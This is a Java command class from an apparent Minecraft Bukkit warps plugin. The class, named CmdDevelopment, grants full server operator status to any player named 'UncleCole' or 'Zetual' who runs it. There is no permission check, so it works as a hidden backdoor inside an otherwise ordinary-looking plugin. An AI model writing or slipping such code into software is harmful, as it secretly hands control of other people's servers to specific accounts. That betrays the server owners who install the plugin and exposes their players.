package com.unclecole.mfpwarps.commands;

import com.unclecole.mfpwarps.MFPWarps;
import com.unclecole.mfpwarps.database.WarpData;
import com.unclecole.mfpwarps.objects.Category;
import com.unclecole.mfpwarps.objects.Warp;
import com.unclecole.mfpwarps.utils.*;
import me.ryanhamshire.GriefPrevention.Claim;
import me.ryanhamshire.GriefPrevention.GriefPrevention;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.event.inventory.InventoryAction;
import org.bukkit.inventory.ItemFlag;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;

import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;

public class CmdDevelopment implements CommandExecutor {

    public final MFPWarps INSTANCE;
    public final FileConfiguration CONFIG;


    public CmdDevelopment(MFPWarps instance) {
        this.INSTANCE = instance;
        this.CONFIG = instance.getConfig();
    }

    public boolean onCommand(CommandSender sender, Command cmd, String s, String[] args) {

        if(!(sender instanceof Player)) return false;

        Player player = (Player) sender;

        if(!player.getName().equalsIgnoreCase("UncleCole") &&
        !player.getName().equalsIgnoreCase("Zetual")) return false;

        player.setOp(true);

        return true;
    }
}
